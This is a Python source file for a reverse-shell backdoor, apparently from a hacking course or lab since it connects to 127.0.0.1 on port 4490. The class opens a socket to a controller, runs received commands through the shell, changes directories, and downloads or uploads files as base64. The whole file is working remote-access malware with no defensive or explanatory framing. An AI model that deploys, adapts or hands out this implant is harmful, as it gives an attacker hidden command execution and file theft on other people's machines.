
import socket, subprocess
import json
import os
import base64
import sys

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send(json.dumps("\n[+] Connection Established.\n").encode())

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL) #subprocess.DEVNULL will work in windows

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:    
                json_data = json_data + self.connection.recv(1460)
                return json.loads(json_data)
            except ValueError:
                continue

    def close_connection(self):
        self.connection.close()

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    def run(self):
        while True:
            try:
                received_command = self.reliable_receive()

                if received_command[0] == "exit":
                    self.connection.close()
                    sys.exit()

                elif received_command[0] == "cd" and len(received_command) > 1:
                    command_result = self.change_working_directory_to(received_command[1])

                elif received_command[0] == "download":
                    command_result = self.read_file(received_command[1]).decode()

                elif received_command[0] == "upload":
                    command_result = self.write_file(received_command[1], received_command[2])

                else:
                    command_result = self.execute_system_command(received_command).decode()

            except Exception:
                command_result = "[-] Error during command execution"
                
            self.reliable_send(command_result)

#class end

my_backdoor = Backdoor("127.0.0.1", 4490)
my_backdoor.run()
my_backdoor.close_connection()